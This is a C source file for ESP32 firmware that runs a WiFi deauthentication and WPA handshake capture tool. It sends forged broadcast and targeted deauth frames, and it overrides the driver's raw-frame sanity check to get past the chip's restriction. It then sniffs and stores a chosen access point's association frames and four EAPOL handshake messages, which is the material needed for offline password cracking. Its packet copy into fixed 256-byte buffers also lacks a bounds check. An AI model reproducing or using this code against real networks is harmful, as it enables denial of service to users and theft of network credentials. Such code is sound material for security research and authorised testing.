#include <stdio.h>
#include <string.h>

#include "esp_wifi.h"
#include "esp_log.h"

#include "eapol.h"
#include "mac_logger.h"
#include "pkt_sniffer.h"
#include "dot11.h"
#include "dot11_data.h"

static const char* TAG = "EAPOL LOGGER";
#define EAPOL_MAX_PKT_LEN 256

static SemaphoreHandle_t lock;
static uint8_t one_time_init_done = 0;

ap_t ap;
uint8_t captured = 0;
uint16_t asoc_req_len = 0;
uint16_t asoc_res_len = 0;
uint16_t eapol_01_len = 0;
uint16_t eapol_02_len = 0;
uint16_t eapol_03_len = 0;
uint16_t eapol_04_len = 0;
uint8_t asoc_req[EAPOL_MAX_PKT_LEN];
uint8_t asoc_res[EAPOL_MAX_PKT_LEN];
uint8_t eapol_01[EAPOL_MAX_PKT_LEN];
uint8_t eapol_02[EAPOL_MAX_PKT_LEN];
uint8_t eapol_03[EAPOL_MAX_PKT_LEN];
uint8_t eapol_04[EAPOL_MAX_PKT_LEN];

//*****************************************************************************
// Lock Helpers
//*****************************************************************************

static uint8_t _take_lock(void)
{
    if(!one_time_init_done)
    {
        ESP_LOGE(TAG, "in take lock, not inited");
        return 1;
    }

    if(!xSemaphoreTake(lock, 10 / portTICK_PERIOD_MS))
    {
        ESP_LOGE(TAG, "lock timeout");
        return 1;
    }

    return 0;
}

static void _release_lock(void)
{
    if(!one_time_init_done)
    {
        ESP_LOGE(TAG, "in release lock, not inited");
        return;
    }
    assert(xSemaphoreGive(lock) == pdTRUE);
}


//*****************************************************************************
// Deauth Stuff
//*****************************************************************************

/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

esp_err_t eapol_logger_send_raw_frame(const uint8_t *frame_buffer, int size){
    return esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
}

esp_err_t eapol_logger_send_deauth_frame(uint8_t* ap_mac){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_mac, 6);
    memcpy(&deauth_frame[16], ap_mac, 6);
    
    return eapol_logger_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

esp_err_t eapol_logger_send_deauth_frame_targted(uint8_t* ap_mac, uint8_t* sta_mac)
{
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[4], sta_mac, 6);
    memcpy(&deauth_frame[10], ap_mac, 6);
    memcpy(&deauth_frame[16], ap_mac, 6);
    
    return eapol_logger_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

esp_err_t eapol_logger_deauth_curr(void)
{
    return eapol_logger_send_deauth_frame(ap.bssid);
}

//*****************************************************************************
// Handling Eapol PKTS
//*****************************************************************************
/*
static void eapol_dump_to_disk(uint8_t ap_index)
{
    char path[33];

    snprintf(path, 32, "/spiffs/%.19s.pkt", ap_list[ap_index].ssid);
    
    ESP_LOGI(TAG, "Opening %s to writeout eapol pkts", path);
    FILE* f = fopen(path, "w");
    if(!f)
    {
        ESP_LOGE(TAG, "Failed to open %s - %s", path, strerror(errno));
        fclose(f);
        return;
    }

    size_t num_written = fwrite(ap_list[ap_index].eapol_pkt_lens, 1, 2*EAPOL_NUM_PKTS, f);
    if(num_written != 2 * EAPOL_NUM_PKTS)
    {
        ESP_LOGE(TAG, "Failed to write EAPOL Header (%d / %d)", num_written, 2*EAPOL_NUM_PKTS);
        fclose(f);
        return;
    }

    uint8_t i;
    for(i = 0; i < EAPOL_NUM_PKTS; ++i)
    {
        num_written = fwrite(ap_list[ap_index].eapol_buffer + i*EAPOL_MAX_PKT_LEN, 1, ap_list[ap_index].eapol_pkt_lens[i], f);
        if(num_written != ap_list[ap_index].eapol_pkt_lens[i])
        {
            ESP_LOGE(TAG, "Failed to write EAPOL %d Pkt (%d / %d)", i, num_written, ap_list[ap_index].eapol_pkt_lens[i]);
            fclose(f);
            return;
        }
    }
    
    fclose(f);
    ESP_LOGI(TAG, "Write out of EAPOL pkts successful!");
}
*/

void eapol_cb(void* pkt, 
              void* meta_data, 
              pkt_type_t type, 
              pkt_subtype_t subtype)
{

    wifi_pkt_rx_ctrl_t* rx_ctrl = (wifi_pkt_rx_ctrl_t*) meta_data;
    dot11_header_t* hdr = pkt;
    uint8_t* buffer = NULL;
    uint16_t* len = NULL;

    if(_take_lock()){return;}

    if(type == PKT_MGMT && subtype.mgmt_subtype == PKT_ASSOC_RES)
    {
        buffer = asoc_res;
        len = &asoc_res_len;
        ESP_LOGI(TAG, "%s -> assoc res", ap.ssid);
    }
    else if(type == PKT_MGMT && subtype.mgmt_subtype == PKT_ASSOC_REQ)
    {
        buffer = asoc_req;
        len = &asoc_req_len;
        ESP_LOGI(TAG, "%s -> assoc req", ap.ssid);
    }
    else if(type == PKT_DATA && subtype.data_subtype == PKT_QOS_DATA && hdr->protect == 0)
    {
        // At this point we know we have an unprotected QoS Data Packet
        qos_data_unprotected_t* qospkt = pkt;

        // Since un protected we can examine and see if can map a snap U-LLC hdr
        if((qospkt->data[0] != LLC_SNAP) || 
           (qospkt->data[1] != LLC_SNAP) ||
           ((qospkt->data[2] % 3) != 0))
        {
            goto eapol_end;
        }

        // Now we can for sure map an snap U-LLC header
        snap_Ullc_header_t* llc = (snap_Ullc_header_t*) qospkt->data;

        if(llc->proto_id == 0x8e88)
        {
            int16_t s = ((dot11_header_t*) pkt)->sequence_num;
            uint8_t ds = ((dot11_header_t*) pkt)->ds_status;

            if(s == 0 && ds == 2) 
            { 
                buffer = eapol_01; 
                len = &eapol_01_len;
                ESP_LOGI(TAG, "%s -> eapol 1", ap.ssid);
            }
            else if(s == 0 && ds == 1) 
            { 
                buffer = eapol_02; 
                len = &eapol_02_len;
                ESP_LOGI(TAG, "%s -> eapol 2", ap.ssid);
            }
            else if(s == 1 && ds == 2) 
            { 
                buffer = eapol_03; 
                len = &eapol_03_len;
                ESP_LOGI(TAG, "%s -> eapol 3", ap.ssid);    
            }
            else if(s == 1 && ds == 1) 
            { 
                buffer = eapol_04; 
                len = &eapol_04_len;
                ESP_LOGI(TAG, "%s -> eapol 4", ap.ssid);
            }
        }
    }

    if(buffer == NULL || len == NULL)
    {
        goto eapol_end;
    }

    if(*len > 0)
    {
        ESP_LOGE(TAG, "Recieved Duplicate EAPOL PKTs, overwriting");
    }

    memcpy(buffer, (uint8_t*) pkt, rx_ctrl->sig_len - 4);
    *len = rx_ctrl->sig_len - 4;

    eapol_end:
    _release_lock();
    return;
}

//*****************************************************************************
// API funcs
//*****************************************************************************

esp_err_t eapol_logger_init(uint8_t mac_logger_ap_index)
{
    esp_err_t e = ESP_OK;
    pkt_sniffer_filtered_src_t f = {0};
    pkt_subtype_t x;

    if(!one_time_init_done)
    {
        lock = xSemaphoreCreateBinary();
        assert(xSemaphoreGive(lock) == pdTRUE);
        one_time_init_done = 1;
        ESP_LOGI(TAG, "lock inited");
    }

    e |= mac_logger_get_ap(mac_logger_ap_index, &ap);
    if(e != ESP_OK)
    {
        ESP_LOGE(TAG, "Invalid mac logger index");
        return e;
    }

    f.cb = eapol_cb;
    x.data_subtype = PKT_QOS_DATA;
    e |= pkt_sniffer_add_type_subtype(&f, PKT_DATA, x);
    x.mgmt_subtype = PKT_ASSOC_RES;
    e |= pkt_sniffer_add_type_subtype(&f, PKT_MGMT, x);
    x.mgmt_subtype = PKT_ASSOC_REQ;
    e |= pkt_sniffer_add_type_subtype(&f, PKT_MGMT, x);
    
    e |= pkt_sniffer_add_mac_match(&f, 3, ap.bssid);

    e |= pkt_sniffer_add_filter(&f);
    ESP_LOGI(TAG, "Type Mask = 0x%x   Data Mask = 0x%x   MGMT Mask = 0x%x\n", f.filter.type_bitmap, f.filter.data_subtype_bitmap, f.filter.mgmt_subtype_bitmap);
    ESP_LOGI(TAG, "AP Targeted: %s\n", ap.ssid);
    return e;
}

esp_err_t eapol_logger_clear(void)
{
    if(_take_lock()){return ESP_ERR_INVALID_STATE;}

    captured = 0;
    asoc_req_len = 0;
    asoc_res_len = 0;
    eapol_01_len = 0;
    eapol_02_len = 0;
    eapol_03_len = 0;
    eapol_04_len = 0;

    ESP_LOGI(TAG, "Buffers Cleared");

    _release_lock();
    return ESP_OK;
}
